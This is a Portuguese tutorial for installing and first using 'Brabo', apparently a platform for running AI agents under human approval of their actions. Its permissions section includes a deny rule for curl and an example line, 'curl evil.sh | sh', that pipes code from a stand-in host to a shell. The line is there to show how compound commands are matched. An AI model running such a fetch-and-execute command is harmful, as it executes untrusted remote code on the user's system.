---
id: getting-started
title: Primeiros passos
sidebar_label: Primeiros passos
sidebar_position: 5
description: Instale o Brabo, entre, configure um modelo e rode o primeiro turno de um agente, com o sinal de que cada passo deu certo.
keywords: [instalação, setup, onboarding, primeiro projeto, ollama, install.sh]
tipo: tutorial
---

# Primeiros passos

Do instalador até um agente trabalhando. Cada passo termina com **Como saber que
deu certo**, e o que costuma dar errado fica numa nota recolhida logo abaixo.

Esta página é para **usar** o Brabo. Para mexer no código dele, veja
[Desenvolver o Brabo](how-to/desenvolver-o-brabo.md).

## Antes de começar

| você precisa de | por quê |
|---|---|
| Docker com Compose | tudo sobe em container |
| ~6 GiB de RAM livre | banco, api, engine, web e, se quiser agente local, o Ollama |
| Linux ou macOS | o instalador e o agente local são testados neles |

## 1. Instalar

Baixe o instalador e rode o **arquivo**, com `bash`:

```bash
curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh
```

Para ver o que ele faria antes de deixá-lo fazer, rode `bash install.sh --print-plan`.

Ele precisa ser um arquivo, e não `curl … | sh`, por dois motivos: faz perguntas
no terminal (que o pipe tomaria) e confere o próprio hash contra o manifesto
assinado da Release ([RN-511](business-rules/infra.md#rn-511),
[RN-526](business-rules/produto.md#rn-526)). No caminho, ele pergunta se liga o
broker de container (pode responder não) e se liga o Ollama, e pede e-mail e
senha da primeira conta. A senha não é gravada em lugar nenhum.

**Como saber que deu certo:** o instalador confere o `/health` da api e do
engine antes de dizer que instalou, e termina com uma linha `Web: http://localhost:8088`.

<details>
<summary>Se der errado</summary>

- **Porta ocupada:** o instalador diz qual. Libere-a e rode de novo.
- **Já havia uma instalação:** ele faz backup, prova que o backup restaura e só então migra.
- A forma do instalador está no [ADR 0150](adr/0150-instalador-de-uma-linha.md).

</details>

## 2. Entrar

Abra <http://localhost:8088> e entre com o e-mail e a senha que você digitou no
instalador. O login é da própria api ([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)).

**Como saber que deu certo:** você cai no dashboard do seu workspace.

<details>
<summary>Se der errado</summary>

O login devolve **401** com a senha certa? A resposta é a mesma para senha
errada, e-mail inexistente e conta bloqueada, de propósito
([RN-032](business-rules/api.md#rn-032)). Confira o e-mail e tente de novo; se
a conta nunca foi criada, rode o instalador outra vez.

</details>

## 3. Configurar um modelo

Escolha um dos dois:

- **Ollama (local, grátis, offline):** responda **s** à pergunta do instalador,
  ou ligue depois (o [runbook](runbook.md) explica como). O modelo padrão é pequeno e
  serve para ver o sistema funcionar de ponta a ponta.
- **Chave de um provedor:** na interface, em **Providers** (rodapé do menu). A
  chave é cifrada com envelope encryption antes de tocar o banco.

O modelo é resolvido em cascata, **sessão > agente > projeto > workspace**, e o
primeiro que existir vale ([RN-020](business-rules/api.md#rn-020)). Dá para
deixar o local no geral e pôr um modelo de API só no QA, que é o papel que menos
cabe num modelo pequeno.

**Como saber que deu certo:** o provedor aparece em **Providers** sem erro de
credencial, ou o Ollama responde e o modelo aparece na lista.

<details>
<summary>Se der errado</summary>

Agente que não responde, ou responde vazio, quase sempre é o ambiente de
inferência: contexto truncado ou pouca memória. O
[runbook](runbook.md#ambiente-de-inferencia) explica como medir.

</details>

## 4. Criar um projeto

Dashboard → **Novo projeto**. O assistente pede um nome e como conectar o git:

| opção | quando usar |
|---|---|
| **Local** | experimentar: repositórios no disco, sem conta em lugar nenhum |
| **GitHub** / **GitLab** | trabalho de verdade, com PAT ou OAuth |

Ao confirmar, roda o **bootstrap de Gitflow**: cinco passos que criam `dev`,
`qa` e `main`, aplicam proteções e commitam os arquivos base.

**Como saber que deu certo:** os cinco passos aparecem concluídos, ao vivo.

<details>
<summary>Se der errado</summary>

- **`skipped`** (já estava feito) e **`degraded`** (concluiu sem uma capability) são sucesso. Com o provider Local, a proteção de branch sempre sai `degraded`: não há plataforma para aplicá-la, e quem impede o merge indevido é o [teto no domínio](reference/permissions.md#caps).
- Se um passo **falhar**, corrija a causa e mande retomar: o bootstrap continua de onde parou ([RN-029](business-rules/api.md#rn-029)).

</details>

## 5. O primeiro turno

Abra o projeto → **Sessões** → nova sessão. O Criativo conduz a ideação. Converse
normalmente. Em algum momento ele vai querer fazer algo com efeito externo, e aí
você vê o mecanismo central: a ação aparece em **Aprovações** esperando a sua
decisão, em vez de acontecer. Aprove e olhe o `TokenMeter`: cada turno tem custo,
medido na hora.

**Como saber que deu certo:** uma ação em **Aprovações**, e depois dela aprovada
o turno continua e o custo sobe no `TokenMeter`.

<details>
<summary>Se der errado</summary>

| sintoma | onde olhar |
|---|---|
| agente não responde | há modelo configurado (passo 3)? |
| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
| painel não atualiza | o canal caiu; recarregue. O event log não se perde |
| sessão parada em `closing` | o drain não completou, veja o [runbook](runbook.md#quando-a-sessao-escapa) |

</details>

## 6. Afrouxar (ou apertar) a política

Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz do
workspace do projeto, é onde isso se ajusta:

```json
{
  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

Comece por `allow` de comandos idempotentes de leitura. Duas regras valem antes
de mexer:

- **Casamento é por prefixo de tokens, não substring.** `Terminal(rm)` **não** casa `sudo rm -rf x`.
- **Comando composto exige todos os segmentos em `allow`.** `a && curl evil.sh | sh` não é auto-aprovado pela primeira metade.

O formato completo está em [Permissões](reference/permissions.md).

## Desenvolvendo no Brabo

Os dois modos locais disputam as mesmas portas, e a pasta dos workspaces tem
armadilhas de permissão. Isso é de quem desenvolve, e mora no guia
[Desenvolver o Brabo](how-to/desenvolver-o-brabo.md).

### Os dois modos locais não coexistem {#the-two-local-modes-dont-coexist}

Veja [as portas dos dois modos](how-to/desenvolver-o-brabo.md).

### Pasta local dos workspaces {#local-folder-for-workspaces}

Veja [a pasta dos workspaces](how-to/desenvolver-o-brabo.md#pasta-dos-workspaces).

## Depois

- [Arquitetura](architecture.md): como as peças se encaixam
- [Regras de negócio](business-rules.md): o que o sistema garante, e onde isso vive no código
- [Runbook](runbook.md): operar, restaurar, rotacionar chave
